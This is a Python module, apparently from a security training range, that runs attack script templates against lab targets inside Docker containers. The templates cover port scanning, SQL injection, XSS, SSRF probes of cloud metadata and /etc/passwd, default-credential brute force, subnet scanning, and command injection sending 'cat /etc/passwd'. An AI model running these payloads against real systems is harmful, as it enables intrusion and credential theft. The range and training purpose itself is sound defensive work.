# -*- coding: utf-8 -*-
"""
沙箱攻击执行器
在真实 Docker 容器中执行攻击命令，产生真实网络请求与输出。
使用 python:3.11-slim 镜像（已在系统白名单中），无需额外工具。

设计原则：
- 攻击容器以 sibling 模式运行（共用宿主机 Docker daemon），不是 Docker-in-Docker
- 自动加入目标容器所在的 bridge 网络，使用容器内网 IP 通信
- 执行超时后强制销毁容器，不留残留
- Docker 不可用或镜像未拉取时静默降级，演练流程不中断
"""

import json
import logging
import threading
from typing import Optional, Tuple

logger = logging.getLogger('services.sandbox_executor')

ATTACKER_IMAGE = 'python:3.11-slim'
SANDBOX_TIMEOUT = 20   # 单次命令最长执行时间（秒）

# ---------------------------------------------------------------------------
# 攻击脚本模板（占位符 __TARGET__ / __PORT__ 在运行时替换，避免 .format() 转义问题）
# ---------------------------------------------------------------------------
_SCRIPTS = {
    '端口扫描': """\
import socket, json
target = '__TARGET__'
ports = [21,22,23,25,53,80,443,445,1433,3306,3389,5432,6379,8080,8443,27017]
open_ports = []
for p in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.8)
    if s.connect_ex((target, p)) == 0:
        banner = ''
        try:
            s.send(b'HEAD / HTTP/1.0\\r\\n\\r\\n')
            banner = s.recv(128).decode(errors='ignore').split('\\n')[0].strip()
        except Exception:
            pass
        open_ports.append({'port': p, 'state': 'open', 'banner': banner[:60]})
    s.close()
print(json.dumps({'target': target, 'open_ports': open_ports, 'total': len(open_ports)}, ensure_ascii=False, indent=2))
""",

    '服务识别': """\
import socket, json, urllib.error
try:
    import urllib.request as ur
except ImportError:
    ur = None
target = '__TARGET__'
port = __PORT__
info = {'target': target, 'port': port, 'services': []}
# HTTP banner
try:
    req = ur.Request(f'http://{target}:{port}/', headers={'User-Agent': 'Mozilla/5.0'})
    with ur.urlopen(req, timeout=5) as r:
        info['http_status'] = r.status
        info['server'] = r.headers.get('Server', 'unknown')
        info['powered_by'] = r.headers.get('X-Powered-By', '')
        info['services'].append({'proto': 'HTTP', 'port': port, 'banner': r.headers.get('Server', '')})
except Exception as e:
    info['http_error'] = str(e)
# TCP banner
try:
    s = socket.socket()
    s.settimeout(2)
    s.connect((target, port))
    s.send(b'\\n')
    banner = s.recv(128).decode(errors='ignore').strip()
    if banner:
        info['tcp_banner'] = banner[:80]
    s.close()
except Exception:
    pass
print(json.dumps(info, ensure_ascii=False, indent=2))
""",

    'SQL注入': """\
import urllib.request as ur, urllib.parse, urllib.error, json, http.cookiejar
target = '__TARGET__'
port = __PORT__
base = f'http://{target}:{port}'
# 常见 SQL 注入探测路径（覆盖 DVWA / 通用 Web 应用 / WebGoat 等靶场）
probe_paths = [
    '/vulnerabilities/sqli/',          # DVWA
    '/search',                         # 通用
    '/index.php',                      # 通用 PHP
    '/',                               # 兜底根路径
]
payloads = [
    ("' OR '1'='1", 'OR 型注入'),
    ("' OR 1=1--",  '注释型注入'),
    ("1 AND SLEEP(0)--", '布尔盲注探测'),
]
# 使用 CookieJar 自动处理 302 重定向（urllib 默认跟随重定向，但不带 Cookie，
# 对 DVWA 等需要登录的靶场会落在 login 页面 —— 这是正常现象，仍然记录响应状态）
results = []
for path in probe_paths:
    for payload, label in payloads:
        url = base + path + '?id=' + urllib.parse.quote(payload)
        try:
            req = ur.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with ur.urlopen(req, timeout=4) as r:
                body = r.read(512).decode(errors='ignore').lower()
                sql_hint = any(k in body for k in ['sql','syntax','mysql','error','warning','exception'])
                results.append({'path': path, 'label': label, 'payload': payload,
                                'status': r.status, 'sql_error_hint': sql_hint})
                break  # 该路径成功响应，跳过剩余同路径 payload
        except urllib.error.HTTPError as e:
            results.append({'path': path, 'label': label, 'payload': payload,
                            'status': e.code, 'sql_error_hint': False})
            break
        except Exception as e:
            results.append({'path': path, 'label': label, 'payload': payload,
                            'error': str(e)[:80]})
            break  # 路径不通，试下一条
print(json.dumps({'attack': 'SQL注入', 'target': base, 'results': results}, ensure_ascii=False, indent=2))
""",

    'XSS攻击': """\
import urllib.request as ur, urllib.parse, json
target = '__TARGET__'
port = __PORT__
base = f'http://{target}:{port}/'
payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
]
results = []
for p in payloads:
    url = base + '?q=' + urllib.parse.quote(p)
    try:
        with ur.urlopen(url, timeout=4) as r:
            body = r.read(512).decode(errors='ignore')
            reflected = p in body or urllib.parse.quote(p) in body
            results.append({'payload': p[:50], 'status': r.status, 'reflected': reflected})
    except Exception as e:
        results.append({'payload': p[:50], 'error': str(e)[:60]})
print(json.dumps({'attack': 'XSS', 'target': base, 'results': results}, ensure_ascii=False, indent=2))
""",

    'SSRF攻击': """\
import urllib.request as ur, urllib.parse, urllib.error, json
target = '__TARGET__'
port = __PORT__
base = f'http://{target}:{port}/'
probes = [
    'http://127.0.0.1/',
    'http://169.254.169.254/latest/meta-data/',
    'http://10.0.0.1/',
    'file:///etc/passwd',
]
results = []
for probe in probes:
    url = base + '?url=' + urllib.parse.quote(probe)
    try:
        with ur.urlopen(url, timeout=3) as r:
            results.append({'probe': probe, 'status': r.status, 'reachable': True})
    except urllib.error.HTTPError as e:
        results.append({'probe': probe, 'status': e.code})
    except Exception as e:
        results.append({'probe': probe, 'error': str(e)[:60]})
print(json.dumps({'attack': 'SSRF', 'target': base, 'results': results}, ensure_ascii=False, indent=2))
""",

    'Web目录枚举': """\
import urllib.request as ur, urllib.error, json
target = '__TARGET__'
port = __PORT__
base = f'http://{target}:{port}'
paths = ['/admin','/login','/phpinfo.php','/robots.txt','/.env','/wp-admin',
         '/api','/backup','/config','/upload','/static','/console']
found, not_found = [], []
for p in paths:
    try:
        with ur.urlopen(base + p, timeout=3) as r:
            found.append({'path': p, 'status': r.status, 'size': len(r.read(32))})
    except urllib.error.HTTPError as e:
        if e.code != 404:
            found.append({'path': p, 'status': e.code})
        else:
            not_found.append(p)
    except Exception:
        not_found.append(p)
print(json.dumps({'attack': '目录枚举', 'base': base, 'found': found, '404_count': len(not_found)},
      ensure_ascii=False, indent=2))
""",

    '暴力破解': """\
import urllib.request as ur, urllib.error, base64, json
target = '__TARGET__'
port = __PORT__
creds = [('admin','admin'),('admin','123456'),('admin','password'),
         ('root','root'),('test','test'),('admin','admin123')]
results = []
for u, p in creds:
    token = base64.b64encode(f'{u}:{p}'.encode()).decode()
    req = ur.Request(f'http://{target}:{port}/', headers={'Authorization': f'Basic {token}'})
    try:
        with ur.urlopen(req, timeout=3) as r:
            results.append({'user': u, 'pass': p, 'status': r.status, 'success': r.status == 200})
    except urllib.error.HTTPError as e:
        results.append({'user': u, 'pass': p, 'status': e.code, 'success': False})
    except Exception as e:
        results.append({'user': u, 'pass': p, 'error': str(e)[:40]})
print(json.dumps({'attack': '暴力破解', 'attempts': len(results),
      'hits': [r for r in results if r.get('success')]}, ensure_ascii=False, indent=2))
""",

    '横向移动': """\
import socket, json
results = []
for i in range(1, 25):
    host = f'172.17.0.{i}'
    for p in [22, 80, 3306, 6379, 8080]:
        s = socket.socket()
        s.settimeout(0.4)
        if s.connect_ex((host, p)) == 0:
            results.append({'host': host, 'port': p, 'state': 'open'})
        s.close()
print(json.dumps({'attack': '横向移动', 'subnet': '172.17.0.0/24',
      'discovered': results}, ensure_ascii=False, indent=2))
""",

    '数据外传': """\
import urllib.request as ur, urllib.error, json
target = '__TARGET__'
port = __PORT__
base = f'http://{target}:{port}'
paths = ['/api/users','/api/data','/export','/dump.sql','/backup.zip','/api/config']
results = []
for p in paths:
    try:
        with ur.urlopen(base + p, timeout=3) as r:
            size = len(r.read(1024))
            results.append({'path': p, 'status': r.status, 'bytes': size})
    except urllib.error.HTTPError as e:
        results.append({'path': p, 'status': e.code})
    except Exception:
        results.append({'path': p, 'status': 'timeout'})
print(json.dumps({'attack': '数据外传', 'target': base, 'probed': results,
      'exposed': [r for r in results if r.get('status') == 200]}, ensure_ascii=False, indent=2))
""",

    '命令执行': """\
import urllib.request as ur, urllib.parse, json
target = '__TARGET__'
port = __PORT__
base = f'http://{target}:{port}/'
cmds = ['id', 'whoami', 'cat /etc/passwd', 'uname -a']
results = []
for cmd in cmds:
    url = base + '?cmd=' + urllib.parse.quote(cmd)
    try:
        with ur.urlopen(url, timeout=4) as r:
            body = r.read(256).decode(errors='ignore')
            rce_hint = any(k in body for k in ['root:','uid=','Linux','Darwin'])
            results.append({'cmd': cmd, 'status': r.status, 'rce_hint': rce_hint, 'preview': body[:80]})
    except Exception as e:
        results.append({'cmd': cmd, 'error': str(e)[:60]})
print(json.dumps({'attack': '命令执行', 'target': base, 'results': results}, ensure_ascii=False, indent=2))
""",
}

# 攻击类型别名映射
_ALIASES = {
    '端口扫描': '端口扫描', '服务识别': '服务识别',
    'OSINT信息收集': '服务识别', 'Web目录枚举': 'Web目录枚举',
    'SQL注入': 'SQL注入', 'SQL注入利用': 'SQL注入',
    'XSS攻击': 'XSS攻击', 'SSRF攻击': 'SSRF攻击', 'SSRF': 'SSRF攻击',
    '暴力破解': '暴力破解', '横向移动': '横向移动',
    '数据外传': '数据外传', '命令执行': '命令执行',
}


# ---------------------------------------------------------------------------
# 公开接口
# ---------------------------------------------------------------------------

def run_sandbox_attack(attack_type: str, target_host: str, target_port: int,
                       container_network: Optional[str] = None) -> dict:
    """
    在隔离的 python:3.11-slim 容器中执行真实攻击脚本。

    参数:
        attack_type:       攻击类型（中文名，见 _ALIASES）
        target_host:       目标主机（容器内网 IP 或容器名）
        target_port:       目标端口
        container_network: 目标容器所在 Docker 网络名（None 则用 bridge）

    返回:
        {'success': bool, 'output': str, 'attack_type': str, 'real': True/False}
    """
    client = _get_docker_client()
    if not client:
        return {'success': False, 'output': 'Docker 客户端不可用，降级为仿真模式', 'real': False}

    mapped = _ALIASES.get(attack_type, attack_type)
    template = _SCRIPTS.get(mapped)
    if not template:
        return {
            'success': False,
            'output': f'沙箱模式暂不支持 [{attack_type}]，已降级为仿真模式',
            'real': False
        }

    script = template.replace('__TARGET__', target_host).replace('__PORT__', str(target_port))
    network = container_network or 'bridge'

    container = None
    try:
        # 检查镜像是否在本地
        try:
            client.images.get(ATTACKER_IMAGE)
        except Exception:
            return {
                'success': False,
                'output': f'攻击镜像 {ATTACKER_IMAGE} 未在本地，请先创建一个 Python 靶场以拉取镜像，或手动执行 docker pull {ATTACKER_IMAGE}',
                'real': False
            }

        container = client.containers.run(
            ATTACKER_IMAGE,
            command=['python3', '-c', script],
            network=network,
            remove=False,
            detach=True,
            mem_limit='64m',
            cpu_quota=25000,
            cpu_period=100000,
        )

        try:
            container.wait(timeout=SANDBOX_TIMEOUT)
        except Exception:
            container.kill()
            container.remove(force=True)
            return {'success': False, 'output': f'沙箱执行超时（>{SANDBOX_TIMEOUT}s）', 'real': False}

        raw = container.logs(stdout=True, stderr=True).decode('utf-8', errors='replace').strip()
        container.remove(force=True)

        # 尝试美化 JSON 输出
        try:
            data = json.loads(raw)
            output = json.dumps(data, ensure_ascii=False, indent=2)
        except (json.JSONDecodeError, ValueError):
            output = raw

        logger.info(f"[SandboxExecutor] 完成: {attack_type} → {target_host}:{target_port}")
        return {'success': True, 'output': output, 'attack_type': attack_type, 'real': True}

    except Exception as e:
        if container:
            try:
                container.remove(force=True)
            except Exception:
                pass
        logger.error(f"[SandboxExecutor] 执行失败 {attack_type}: {e}")
        return {'success': False, 'output': str(e), 'real': False}


def get_target_network_and_ip(container_port: int) -> Tuple[Optional[str], Optional[str], Optional[int]]:
    """
    通过端口查找目标容器的 Docker 内网 IP、所在网络名和容器内部端口。
    返回 (ip, network_name, internal_port)，找不到时返回 (None, None, None)。

    重要：即使入参是主机端口（如 8080），返回的 internal_port 也是容器内部端口（如 80），
    因为沙箱脚本在 Docker 内网中通信，必须使用容器内部端口。
    """
    client = _get_docker_client()
    if not client:
        return None, None, None
    try:
        from services.docker_isolate import _find_container_name_by_port
        cname = _find_container_name_by_port(container_port)
        if not cname:
            return None, None, None
        container = client.containers.get(cname)
        container.reload()

        # 获取容器的内部端口（从 Docker inspect 或 targets 配置）
        internal_port = None
        # 方法1：从 Docker 暴露端口获取
        exposed_ports = container.attrs.get('Config', {}).get('ExposedPorts', {})
        if exposed_ports:
            for port_key in exposed_ports:
                try:
                    internal_port = int(port_key.split('/')[0])
                    break
                except (ValueError, IndexError):
                    pass
        # 方法2：从 targets 表配置获取（更可靠）
        if internal_port is None:
            try:
                from pathlib import Path
                import sqlite3, json
                db_path = Path(__file__).parent.parent / 'data' / 'ai_security_range.db'
                conn = sqlite3.connect(str(db_path))
                conn.row_factory = sqlite3.Row
                cur = conn.cursor()
                cur.execute("SELECT config FROM targets WHERE status = 'running'")
                for row in cur.fetchall():
                    try:
                        cfg = json.loads(row['config'] or '{}')
                        if cfg.get('container_name') == cname or cfg.get('container_port') == container_port or cfg.get('host_port') == container_port:
                            internal_port = cfg.get('container_port')
                            break
                    except (json.JSONDecodeError, TypeError):
                        pass
                conn.close()
            except Exception:
                pass
        # 兜底：用入参
        if internal_port is None:
            internal_port = container_port

        for net_name, net_info in container.attrs['NetworkSettings']['Networks'].items():
            if net_name not in ('host', 'none'):
                ip = net_info.get('IPAddress', '')
                if ip:
                    return ip, net_name, internal_port
    except Exception as e:
        logger.warning(f"[SandboxExecutor] 获取容器网络失败: {e}")
    return None, None, None


# ---------------------------------------------------------------------------
# 内部辅助
# ---------------------------------------------------------------------------

def _get_docker_client():
    try:
        import docker
        return docker.from_env()
    except Exception as e:
        logger.warning(f"[SandboxExecutor] Docker 初始化失败: {e}")
        return None
